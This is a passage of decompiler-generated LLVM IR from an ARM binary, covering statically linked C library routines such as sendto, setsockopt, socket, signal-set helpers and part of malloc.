dec_label_pc_11430:                               ; preds = %entry.dec_label_pc_11430_crit_edge, %dec_label_pc_11428
  %v0_11430 = call i32 @__libc_enable_asynccancel()
  %v0_11434 = load i32, i32* @r6, align 4
  store i32 %v0_11434, i32* @r1, align 4
  store i32 %v0_11430, i32* @r5, align 4
  %v0_11440 = load i32, i32* @r8, align 4
  store i32 %v0_11440, i32* @r3, align 4
  %v0_11444 = load i32, i32* @r4, align 4
  store i32 %v0_11444, i32* @r0, align 4
  %v0_11448 = call i32 @__sys_send()
  store i32 %v0_11448, i32* @r4, align 4
  %v0_11450 = load i32, i32* @r5, align 4
  %v1_11454 = call i32 @__libc_disable_asynccancel(i32 %v0_11450)
  %v0_11458 = load i32, i32* @r4, align 4
  %v2_1145c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1145c, i32* @r4, align 4
  store i32 %v6_11400, i32* @r5, align 4
  store i32 %v9_11400, i32* @r6, align 4
  store i32 %v12_11400, i32* @r7, align 4
  store i32 %v15_11400, i32* @r8, align 4
  store i32 %v18_11400, i32* @lr, align 4
  ret i32 %v0_11458

; uselistorder directives
  uselistorder label %dec_label_pc_11430, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1146c = load i32, i32* @r4, align 4
  store i32 %v3_1146c, i32* %stack_var_-16, align 4
  %v0_11480 = load i32, i32* @r0, align 4
  store i32 %v0_11480, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11480, -4095
  br i1 %tmp, label %dec_label_pc_114a8, label %dec_label_pc_11490

dec_label_pc_11490:                               ; preds = %entry
  %v0_11494 = call i32 @__aeabi_read_tp()
  %v3_11498 = load i16, i16* @global_var_21510.336, align 2
  %v4_11498 = sext i16 %v3_11498 to i32
  %v0_1149c = load i32, i32* %r2.global-to-local, align 4
  %v1_1149c = sub i32 0, %v0_1149c
  store i32 %v1_1149c, i32* %r2.global-to-local, align 4
  %v3_114a0 = add i32 %v4_11498, %v0_11494
  %v4_114a0 = inttoptr i32 %v3_114a0 to i32*
  store i32 %v1_1149c, i32* %v4_114a0, align 4
  %v2_114a8.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_114a8

dec_label_pc_114a8:                               ; preds = %entry, %dec_label_pc_11490
  %v1_114ac = phi i32 [ %v0_11480, %entry ], [ -1, %dec_label_pc_11490 ]
  %v2_114a8 = phi i32 [ %v3_1146c, %entry ], [ %v2_114a8.pre, %dec_label_pc_11490 ]
  store i32 %v2_114a8, i32* @r4, align 4
  ret i32 %v1_114ac

; uselistorder directives
  uselistorder i32 %v0_11480, { 1, 0, 2 }
  uselistorder label %dec_label_pc_114a8, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_114b0:
  %v0_114b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_114b0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_114b0
  %v5_114b0 = udiv i32 %arg3, 4
  %v6_114b0 = and i32 %v5_114b0, %arg1
  %v5_114b4 = sub nsw i32 32, %v6_114b0
  %v6_114b4 = shl i32 %v6_114b0, %v5_114b4
  %v9_114b4 = and i32 %v6_114b4, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_114b0, %bb
  %v10_114b4 = phi i32 [ %arg1, %dec_label_pc_114b0 ], [ %v9_114b4, %bb ]
  ret i32 %v10_114b4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_114b8 = load i32, i32* @r4, align 4
  store i32 %v3_114b8, i32* %stack_var_-32, align 4
  %v6_114b8 = load i32, i32* @r5, align 4
  %v9_114b8 = load i32, i32* @r6, align 4
  %v12_114b8 = load i32, i32* @r7, align 4
  %v15_114b8 = load i32, i32* @r8, align 4
  %v18_114b8 = load i32, i32* @sb, align 4
  %v21_114b8 = load i32, i32* @sl, align 4
  %v24_114b8 = load i32, i32* @lr, align 4
  %v4_114c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 12772) to i32*), align 4
  %v2_114d0 = icmp eq i32 %v4_114c8, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_114d0, label %dec_label_pc_114f0, label %dec_label_pc_114fc

dec_label_pc_114f0:                               ; preds = %entry
  store i32 %v3_114b8, i32* @r4, align 4
  store i32 %v12_114b8, i32* @r7, align 4
  store i32 %v15_114b8, i32* @r8, align 4
  store i32 %v18_114b8, i32* %sb.global-to-local, align 4
  %v0_114f8 = call i32 @__sys_sendto()
  br label %dec_label_pc_114fc

dec_label_pc_114fc:                               ; preds = %entry, %dec_label_pc_114f0
  %v0_114fc = call i32 @__libc_enable_asynccancel()
  store i32 %v0_114fc, i32* @r5, align 4
  %v0_11510 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_11510, i32* @r0, align 4
  %v0_11518 = call i32 @__sys_sendto()
  store i32 %v0_11518, i32* @r4, align 4
  %v0_11520 = load i32, i32* @r5, align 4
  %v1_11524 = call i32 @__libc_disable_asynccancel(i32 %v0_11520)
  %v0_11528 = load i32, i32* @r4, align 4
  %v2_11530 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_11530, i32* @r4, align 4
  store i32 %v6_114b8, i32* @r5, align 4
  store i32 %v9_114b8, i32* @r6, align 4
  store i32 %v12_114b8, i32* @r7, align 4
  store i32 %v15_114b8, i32* @r8, align 4
  store i32 %v18_114b8, i32* @sb, align 4
  store i32 %v21_114b8, i32* @sl, align 4
  store i32 %v24_114b8, i32* @lr, align 4
  ret i32 %v0_11528

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_114fc, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11540 = load i32, i32* @r4, align 4
  store i32 %v3_11540, i32* %stack_var_-12, align 4
  %v0_11550 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11550, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11550, -4095
  br i1 %tmp, label %dec_label_pc_11578, label %dec_label_pc_11560

dec_label_pc_11560:                               ; preds = %entry
  %v0_11564 = call i32 @__aeabi_read_tp()
  %v3_11568 = load i16, i16* @global_var_21510.336, align 2
  %v4_11568 = sext i16 %v3_11568 to i32
  %v0_1156c = load i32, i32* %r2.global-to-local, align 4
  %v1_1156c = sub i32 0, %v0_1156c
  store i32 %v1_1156c, i32* %r2.global-to-local, align 4
  %v3_11570 = add i32 %v4_11568, %v0_11564
  %v4_11570 = inttoptr i32 %v3_11570 to i32*
  store i32 %v1_1156c, i32* %v4_11570, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11578.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11578

dec_label_pc_11578:                               ; preds = %entry, %dec_label_pc_11560
  %v1_1157c = phi i32 [ %v0_11550, %entry ], [ -1, %dec_label_pc_11560 ]
  %v2_11578 = phi i32 [ %v3_11540, %entry ], [ %v2_11578.pre, %dec_label_pc_11560 ]
  store i32 %v2_11578, i32* @r4, align 4
  ret i32 %v1_1157c

; uselistorder directives
  uselistorder i32 %v0_11550, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11578, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1) local_unnamed_addr {
dec_label_pc_11580:
  %v0_11580 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11580, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11580
  %v2_11580 = load i32, i32* @r6, align 4
  %v5_11580 = udiv i32 %v2_11580, 4
  %v6_11580 = and i32 %v5_11580, %arg1
  call void @__pseudo_branch(i32 0)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11580, %bb
  %v7_11584 = phi i32 [ %arg1, %dec_label_pc_11580 ], [ %v6_11580, %bb ]
  ret i32 %v7_11584

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11588 = load i32, i32* @r7, align 4
  store i32 %v3_11588, i32* %stack_var_-8, align 4
  %v0_11594 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11594, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11594, -4095
  br i1 %tmp, label %dec_label_pc_115bc, label %dec_label_pc_115a4

dec_label_pc_115a4:                               ; preds = %entry
  %v0_115a8 = call i32 @__aeabi_read_tp()
  %v3_115ac = load i16, i16* @global_var_21510.336, align 2
  %v4_115ac = sext i16 %v3_115ac to i32
  store i32 %v4_115ac, i32* @r3, align 4
  %v0_115b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_115b0 = sub i32 0, %v0_115b0
  store i32 %v1_115b0, i32* %r2.global-to-local, align 4
  %v3_115b4 = add i32 %v4_115ac, %v0_115a8
  %v4_115b4 = inttoptr i32 %v3_115b4 to i32*
  store i32 %v1_115b0, i32* %v4_115b4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_115bc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_115bc

dec_label_pc_115bc:                               ; preds = %entry, %dec_label_pc_115a4
  %v1_115c0 = phi i32 [ %v0_11594, %entry ], [ -1, %dec_label_pc_115a4 ]
  %v2_115bc = phi i32 [ %v3_11588, %entry ], [ %v2_115bc.pre, %dec_label_pc_115a4 ]
  store i32 %v2_115bc, i32* @r7, align 4
  ret i32 %v1_115c0

; uselistorder directives
  uselistorder i32 %v0_11594, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_115bc, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_115c4:
  %v0_115c4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_115c4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_115c4
  %v3_115c8 = call i32 @__libc_errno()
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_115c4, %bb
  %v4_115c8 = phi i32 [ %arg1, %dec_label_pc_115c4 ], [ %v3_115c8, %bb ]
  ret i32 %v4_115c8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp4 = icmp slt i32 %arg2, 1
  br i1 %tmp4, label %dec_label_pc_115e4, label %dec_label_pc_115dc

dec_label_pc_115dc:                               ; preds = %entry
  %v7_115e0 = icmp slt i32 %arg2, 65
  br i1 %v7_115e0, label %dec_label_pc_11600, label %dec_label_pc_115e4

dec_label_pc_115e4:                               ; preds = %dec_label_pc_115dc, %entry
  %v0_115e8 = call i32 @__aeabi_read_tp()
  %v3_115ec = load i16, i16* @global_var_21510.336, align 2
  %v4_115ec = sext i16 %v3_115ec to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_115f8 = add i32 %v4_115ec, %v0_115e8
  %v4_115f8 = inttoptr i32 %v3_115f8 to i32*
  store i32 22, i32* %v4_115f8, align 4
  %v0_11608.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11608

dec_label_pc_11600:                               ; preds = %dec_label_pc_115dc
  %v0_11600 = call i32 @__sigaddset()
  store i32 %v0_11600, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11608

dec_label_pc_11608:                               ; preds = %dec_label_pc_115e4, %dec_label_pc_11600
  %v0_11608 = phi i32 [ %v0_11608.pre, %dec_label_pc_115e4 ], [ %v0_11600, %dec_label_pc_11600 ]
  ret i32 %v0_11608

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11608, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_11624 = add i32 %tmp, 4
  %v3_11624 = inttoptr i32 %v2_11624 to i32*
  store i32 0, i32* %v3_11624, align 4
  %v1_11628 = load i32, i32* %r3.global-to-local, align 4
  %v2_11628 = inttoptr i32 %v1_11628 to i32*
  store i32 0, i32* %v2_11628, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11630 = load i32, i32* @r4, align 4
  store i32 %v3_11630, i32* %stack_var_-16, align 4
  %v6_11630 = load i32, i32* @r5, align 4
  %v9_11630 = load i32, i32* @r6, align 4
  %v7_11638 = icmp eq i32 %arg2, -1
  br i1 %v7_11638, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_11640 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_1165c

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_11664

dec_label_pc_1165c:                               ; preds = %bb
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* @r6, align 4
  %v7_11660 = icmp slt i32 %arg1, 65
  br i1 %v7_11660, label %dec_label_pc_11680, label %dec_label_pc_11664

dec_label_pc_11664:                               ; preds = %.thread16, %dec_label_pc_1165c
  %v0_11668 = call i32 @__aeabi_read_tp()
  %v3_1166c = load i16, i16* @global_var_21510.336, align 2
  %v4_1166c = sext i16 %v3_1166c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_11678 = add i32 %v4_1166c, %v0_11668
  %v4_11678 = inttoptr i32 %v3_11678 to i32*
  store i32 22, i32* %v4_11678, align 4
  %v0_116d8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_11680:                               ; preds = %dec_label_pc_1165c
  %v2_11680 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_11680, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_11688 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_11688, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_11698 = call i32 @__sigaddset()
  %v0_116a0 = load i32, i32* @r5, align 4
  store i32 %v0_116a0, i32* %r1.global-to-local, align 4
  %v0_116a4 = load i32, i32* @r6, align 4
  %v2_116a4 = add i32 %v0_116a4, 11868
  %v2_116a8 = call i32 @__GI___sigismember(i32 %v2_116a4, i32 %v0_116a0)
  store i32 %v2_11680, i32* %r1.global-to-local, align 4
  %v0_116bc = load i32, i32* @r5, align 4
  %v3_116c8 = call i32 @__libc_sigaction(i32 %v0_116bc, i32 %v2_11680, i32 %v2_11640)
  %v1_116cc = icmp slt i32 %v3_116c8, 0
  br i1 %v1_116cc, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_11680
  %v5_116d0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_116d0, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_11680
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_11664, %bb32
  %v0_116d8 = phi i32 [ %v5_116d0, %bb31 ], [ %v0_116d8.pre, %dec_label_pc_11664 ], [ -1, %bb32 ]
  %v2_116e0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_116e0, i32* @r4, align 4
  store i32 %v6_11630, i32* @r5, align 4
  store i32 %v9_11630, i32* @r6, align 4
  ret i32 %v0_116d8

; uselistorder directives
  uselistorder i32 %v2_11680, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11664, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_116f4 = add i32 %arg2, -1
  %v3_116f8 = udiv i32 %v1_116f4, 32
  %v4_116fc = mul nuw nsw i32 %v3_116f8, 4
  %v5_116fc = add i32 %v4_116fc, %arg1
  %v6_116fc = inttoptr i32 %v5_116fc to i32*
  %v7_116fc = load i32, i32* %v6_116fc, align 4
  %v1_11700 = urem i32 %v1_116f4, 32
  %v7_11708 = shl i32 1, %v1_11700
  %v8_11708 = and i32 %v7_116fc, %v7_11708
  %v10_11708 = icmp ne i32 %v8_11708, 0
  %. = zext i1 %v10_11708 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_116f4, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_11718 = load i32, i32* @r1, align 4
  %v1_11718 = add i32 %v0_11718, -1
  %v3_1171c = udiv i32 %v1_11718, 32
  %v0_11720 = load i32, i32* @r0, align 4
  %v4_11720 = mul nuw nsw i32 %v3_1171c, 4
  %v5_11720 = add i32 %v0_11720, %v4_11720
  %v6_11720 = inttoptr i32 %v5_11720 to i32*
  %v7_11720 = load i32, i32* %v6_11720, align 4
  %v1_11724 = urem i32 %v1_11718, 32
  %v7_1172c = shl i32 1, %v1_11724
  %v8_1172c = or i32 %v7_11720, %v7_1172c
  store i32 %v8_1172c, i32* %v6_11720, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_11718, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1173c = add i32 %arg2, -1
  %v3_11740 = udiv i32 %v1_1173c, 32
  %v4_11744 = mul nuw nsw i32 %v3_11740, 4
  %v5_11744 = add i32 %v4_11744, %arg1
  %v6_11744 = inttoptr i32 %v5_11744 to i32*
  %v7_11744 = load i32, i32* %v6_11744, align 4
  %v1_11748 = urem i32 %v1_1173c, 32
  %tmp = shl i32 -1, %v1_11748
  %v8_11750 = add i32 %tmp, -1
  %v9_11750 = and i32 %v7_11744, %v8_11750
  store i32 %v9_11750, i32* %v6_11744, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1173c, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_11760 = udiv i32 %arg1, 256
  store i32 %v3_11760, i32* %r1.global-to-local, align 4
  %v2_11764 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_11764, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_11770 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_11764, i32 %v0_11770)
  %v0_11774 = load i32, i32* %r1.global-to-local, align 4
  %v1_11774 = add i32 %v0_11774, 1048320
  %v3_11778 = udiv i32 %v1_11774, 65536
  %v1_1177c = and i32 %v3_11778, 8
  %v6_11780 = shl i32 %v0_11774, %v1_1177c
  %v1_11784 = add i32 %v6_11780, 520192
  %v3_11788 = udiv i32 %v1_11784, 65536
  %v1_1178c = and i32 %v3_11788, 4
  %v6_11790 = shl i32 %v6_11780, %v1_1178c
  %v1_11794 = add i32 %v6_11790, 245760
  %v3_11798 = udiv i32 %v1_11794, 65536
  %v1_1179c = and i32 %v3_11798, 2
  %v6_117a0 = shl i32 %v6_11790, %v1_1179c
  store i32 %v6_117a0, i32* %r1.global-to-local, align 4
  %v1_117a4 = sub nsw i32 13, %v1_1177c
  %v2_117a8 = sub nsw i32 %v1_117a4, %v1_1178c
  %v3_117ac = udiv i32 %v6_117a0, 32768
  %v4_117ac = sub nuw nsw i32 -1, %v3_117ac
  %v4_117b0 = udiv i32 %v6_117a0, 16384
  %v5_117b0 = and i32 %v4_117b0, %v4_117ac
  %v2_117b4 = sub nsw i32 %v2_117a8, %v1_1179c
  %v2_117b8 = add nsw i32 %v2_117b4, %v5_117b0
  %v1_117bc = add nsw i32 %v2_117b8, 6
  %v0_117c0 = load i32, i32* %ip.global-to-local, align 4
  %v6_117c0 = lshr i32 %v0_117c0, %v1_117bc
  %v3_117c4 = mul nsw i32 %v2_117b8, 4
  %v1_117c8 = add nsw i32 %v3_117c4, 32
  %v1_117cc = urem i32 %v6_117c0, 4
  %v2_117d0 = or i32 %v1_117cc, %v1_117c8
  ret i32 %v2_117d0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_117d8 = load i32, i32* @r4, align 4
  %v6_117d8 = load i32, i32* @r5, align 4
  %v9_117d8 = load i32, i32* @r6, align 4
  %v12_117d8 = load i32, i32* @r7, align 4
  %v15_117d8 = load i32, i32* @r8, align 4
  %v18_117d8 = load i32, i32* @sb, align 4
  %v21_117d8 = load i32, i32* @sl, align 4
  %v24_117d8 = load i32, i32* @fp, align 4
  %v27_117d8 = load i32, i32* @lr, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r1.global-to-local, align 4
  %v4_117ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 108) to i32*), align 4
  store i32 %v4_117ec, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_117f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 68) to i32*), align 4
  store i32 %v4_117f8, i32* %r1.global-to-local, align 4
  %v0_117fc = load i32, i32* @r0, align 4
  store i32 %v0_117fc, i32* @r5, align 4
  store i32 %v4_117ec, i32* %r2.global-to-local, align 4
  %v2_11804 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_11804, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %ip.global-to-local, align 4
  %v4_11810 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 112) to i32*), align 4
  store i32 %v4_11810, i32* %ip.global-to-local, align 4
  store i32 71708, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11810)
  %v0_1181c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1181c, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* @r1, align 4
  %v4_11828 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 16) to i32*), align 4
  store i32 %v4_11828, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_11834.421 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11828)
  %v0_11834 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_11834, -32
  br i1 %tmp, label %dec_label_pc_11858, label %dec_label_pc_1183c

dec_label_pc_1183c:                               ; preds = %entry
  store i32 64708, i32* %r2.global-to-local, align 4
  %v0_11840 = call i32 @__aeabi_read_tp()
  store i32 %v0_11840, i32* %r0.global-to-local, align 4
  %v3_11844 = load i16, i16* @global_var_21510.336, align 2
  %v4_11844 = sext i16 %v3_11844 to i32
  store i32 %v4_11844, i32* %r2.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_11850 = add i32 %v4_11844, %v0_11840
  %v4_11850 = inttoptr i32 %v3_11850 to i32*
  store i32 12, i32* %v4_11850, align 4
  br label %dec_label_pc_120dc

dec_label_pc_11858:                               ; preds = %entry
  %v1_11858 = add i32 %v0_11834, 11
  store i32 %v1_11858, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r2.global-to-local, align 4
  %v2_11864 = icmp ugt i32 %v1_11858, 14
  %v7_11864 = icmp eq i32 %v1_11858, 15
  %v2_11868 = xor i1 %v7_11864, true
  %v3_11868 = and i1 %v2_11864, %v2_11868
  br i1 %v3_11868, label %bb, label %bb141

bb:                                               ; preds = %dec_label_pc_11858
  %v5_11868 = and i32 %v1_11858, -8
  store i32 %v5_11868, i32* @sl, align 4
  br label %bb141

bb141:                                            ; preds = %dec_label_pc_11858, %bb
  %v4_1186c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 64) to i32*), align 4
  store i32 %v4_1186c, i32* @r0, align 4
  %v1_11870 = inttoptr i32 %v4_1186c to i32*
  %v2_11870 = load i32, i32* %v1_11870, align 4
  store i32 %v2_11870, i32* @r4, align 4
  %v2_11874 = xor i1 %v2_11864, true
  %v3_11874 = or i1 %v7_11864, %v2_11874
  br i1 %v3_11874, label %bb142, label %bb143

bb142:                                            ; preds = %bb141
  store i32 16, i32* @sl, align 4
  br label %bb143

bb143:                                            ; preds = %bb141, %bb142
  %v1_11878 = urem i32 %v2_11870, 2
  %v2_11878 = icmp eq i32 %v1_11878, 0
  br i1 %v2_11878, label %dec_label_pc_11880, label %dec_label_pc_11890

dec_label_pc_11880:                               ; preds = %bb143
  %v2_11880 = icmp eq i32 %v2_11870, 0
  br i1 %v2_11880, label %dec_label_pc_11888, label %dec_label_pc_11c6c

dec_label_pc_11888:                               ; preds = %dec_label_pc_11880
  %v0_11888 = call i32 @__malloc_consolidate()
  store i32 %v0_11888, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11c6c

dec_label_pc_11890:                               ; preds = %bb143
  %v0_11890 = load i32, i32* @sl, align 4
  %tmp204 = icmp ugt i32 %v0_11890, %v2_11870
  br i1 %tmp204, label %dec_label_pc_118b8, label %dec_label_pc_11898

dec_label_pc_11898:                               ; preds = %dec_label_pc_11890
  %v1_11898 = add i32 %v4_1186c, -4
  store i32 %v1_11898, i32* %r1.global-to-local, align 4
  %v3_1189c = udiv i32 %v0_11890, 8
  store i32 %v3_1189c, i32* %r2.global-to-local, align 4
  %v4_118a0 = mul nuw i32 %v3_1189c, 4
  %v5_118a0 = add i32 %v4_118a0, %v1_11898
  %v6_118a0 = inttoptr i32 %v5_118a0 to i32*
  %v7_118a0 = load i32, i32* %v6_118a0, align 4
  store i32 %v7_118a0, i32* %r0.global-to-local, align 4
  %v2_118a4 = icmp eq i32 %v7_118a0, 0
  br i1 %v2_118a4, label %dec_label_pc_118b8, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_11898
  %v2_118a8 = add i32 %v7_118a0, 8
  %v3_118a8 = inttoptr i32 %v2_118a8 to i32*
  %v4_118a8 = load i32, i32* %v3_118a8, align 4
  store i32 %v4_118a8, i32* %r3.global-to-local, align 4
  store i32 %v2_118a8, i32* %r0.global-to-local, align 4
  store i32 %v2_118a8, i32* %r4.global-to-local, align 4
  store i32 %v4_118a8, i32* %v6_118a0, align 4
  br label %dec_label_pc_120c0

dec_label_pc_118b8:                               ; preds = %dec_label_pc_11898, %dec_label_pc_11890
  %tmp205 = icmp ugt i32 %v0_11890, 255
  br i1 %tmp205, label %dec_label_pc_11908, label %dec_label_pc_118c0

dec_label_pc_118c0:                               ; preds = %dec_label_pc_118b8
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
